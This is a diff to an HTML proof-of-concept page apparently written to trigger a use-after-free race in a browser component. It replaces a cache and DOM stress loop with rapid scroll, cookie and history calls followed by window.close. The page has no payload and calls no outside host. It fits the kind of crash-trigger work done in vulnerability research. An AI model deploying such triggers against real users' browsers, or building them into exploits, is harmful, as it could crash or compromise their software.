@@ -1,26 +1,22 @@
 <!DOCTYPE html>
 <html>
-<head><title>UAF Trigger</title></head>
+<head><title>UAF Race Trigger</title></head>
 <body>
 <script>
-    // Spam the Cache API to keep the C++ async threads busy
-    async function stressCache() {
-        while(true) {
-            let cache = await caches.open('v1-heavy-cache');
-            await cache.put('/dummy.txt', new Response('A'.repeat(1024 * 1024))); // 1MB chunk
-            await cache.match('/dummy.txt');
+    // Rapidly trigger internal IPC messages to libhelium
+    function spamMojo() {
+        for(let i = 0; i < 50; i++) {
+            // Force the WebContents to query its layout/cache
+            window.scrollTo(0, Math.random() * 100);
+            document.cookie = "fuzz" + i + "=test; max-age=1";
+            history.pushState({}, "", "/#fuzz" + i);
         }
-    }
-    
-    // Spam massive DOM updates to stress the rendering tree
-    function stressRenderer() {
-        setInterval(() => {
-            document.body.innerHTML = '<div>' + Math.random() + '</div>'.repeat(5000);
-        }, 10);
+        // Attempt to trigger the destruction callback from the inside
+        setTimeout(() => { window.close(); }, 50);
     }
 
-    stressCache();
-    stressRenderer();
+    // Run immediately
+    spamMojo();
 </script>
 </body>
 </html>
